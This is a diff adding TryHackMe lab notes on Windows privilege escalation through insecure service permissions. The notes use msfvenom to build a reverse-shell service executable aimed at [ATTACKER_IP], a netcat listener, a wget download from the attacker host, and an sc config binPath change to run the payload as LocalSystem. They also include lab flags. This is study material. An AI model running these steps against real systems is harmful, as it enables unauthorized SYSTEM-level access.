@@ -139,5 +139,26 @@ sc stop "disk sorter enterprise"
 sc start "disk sorter enterprise"
 *THM{QUOTES_EVERYWHERE}
 
+Insecure Service Permissions
+-check if service DACL allows the attacker to modify the configuration of a service
+accesschk64.exe -qlc thmservice
+-if BUILTIN\\Users has SERVICE_ALL_ACCESS permission, the user can reconfigure the service
+-generate a reverse shell
+msfvenom -p windows/x64/shell_reverse_tcp HOST=[ATTACKER_IP] PORT=[PORT] -f exe-service -o rev-svc3.exe
+-start netcat listener
+nc -lvp [PORT]
+-start server
+python3 -m http.server
+-get payload on victim machine
+wget http://[ATTACKER_IP]:[port]/rev-svc3.exe -O rev-svc3.exe
+-grant permission
+C:\> icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
+-configure service
+sc config THMService binPath="C:\Users\thm-unpriv\rev-svc3.exe" obj=LocalSystem
+-restart server
+sc stop THMService
+sc start THMService
+*THM{INSECURE_SVC_CONFIG}
+
 
 
